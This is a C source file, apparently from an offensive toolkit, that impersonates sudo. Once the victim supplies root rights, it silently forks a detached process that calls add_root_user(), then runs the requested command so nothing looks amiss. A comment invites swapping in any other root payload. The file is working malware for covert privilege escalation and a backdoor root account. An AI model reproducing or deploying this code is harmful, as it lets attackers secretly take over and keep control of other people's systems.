#include "tas/tas.h"
#include "tas/constructor.c"
#include "fun/add-root-user.c"

#include <stdio.h>
#include <string.h>

#include <sys/types.h>
#include <fcntl.h>

int check_args(int argc, char **argv)
{
	if (argc <= 1) {
		goto end;
	}

	if (!strcmp(argv[0], "sudo")) {
		if (argv[1][0] != '-') {
			return 0;
		}
	}

end:
	return 1;
}

// edit this function to run
// what you want as root
void super(void)
{
	add_root_user();
}

void prepare(void)
{
	int fd;
	pid_t pid = fork();
	if (pid == 0) {
		setsid();

		fd = open("/dev/null", O_RDWR);
		dup2(fd, 0);
		dup2(fd, 1);
		dup2(fd, 2);

		if (fd > 2)
			close(fd);

		super();
		_exit(0);
	}
}

void runme(int argc, char **argv)
{
	if (getuid() == 0) {
		prepare();

		if (argc > 1) {
			tas_execv(argv[1], argv + 1);
		}

		_exit(1);
	}

	if (check_args(argc, argv)) {
		// change
		tas_execv("sudo", argv);
		_exit(0);
	}

	if(argc > 1) {
		// don't care about overwrite the argc
		argv[-1] = argv[0];
		argv[0] = current_exe;
		argv[1] = getfullpath(argv[1]);

		// human readable
		argv--;
	}

	tas_execv("sudo", argv);
	_exit(0);
}

int main(int argc, char **argv)
{
	runme(argc, argv);
}
